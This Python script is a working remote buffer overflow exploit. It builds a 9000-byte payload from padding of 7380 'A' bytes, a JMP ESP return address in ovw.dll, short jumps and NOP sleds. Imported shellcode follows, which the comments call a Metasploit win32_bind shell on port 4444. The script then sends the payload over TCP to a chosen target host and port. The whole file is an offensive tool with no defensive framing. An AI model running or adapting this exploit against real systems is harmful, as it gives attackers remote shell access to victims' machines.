
from payload import buf
import socket


def shell_attack(target_machine, target_port):

#win32_bind -  EXITFUNC=thread LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com 
	

	#9000 bytes; 7380+4+1616
	#JMP ESP: 0x5A10A88B ovw.dll
	#Note:  Other possible offsets to EIP we've seen:
	#       [ "\x41"*7392 ] + [ EIP ] + [ junk ]
	#       [ "\x41"*7332 ] + [ EIP ] + [ junk ]
	buff = (b"\x41"*7380+
	#Compensate for varying IP lengths
	b"\x8b\xa8\x10\x5a"
	b"\xeb\x18\x90\x90"
	b"\x8b\xa8\x10\x5a"
	b"\xeb\x11\x90\x90"
	b"\x8b\xa8\x10\x5a"
	b"\xeb\x08\x90\x90"
	b"\x8b\xa8\x10\x5a"
	b"\x90\x90\x90\x90"
	b"\x90\x90\x90\x90"+
	buf+
	b"\xCC"*(1584-len(buf))
	)


	

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_machine, target_port))
	
	s.send(buff)
	#print s.recv(1024)
	s.close()
	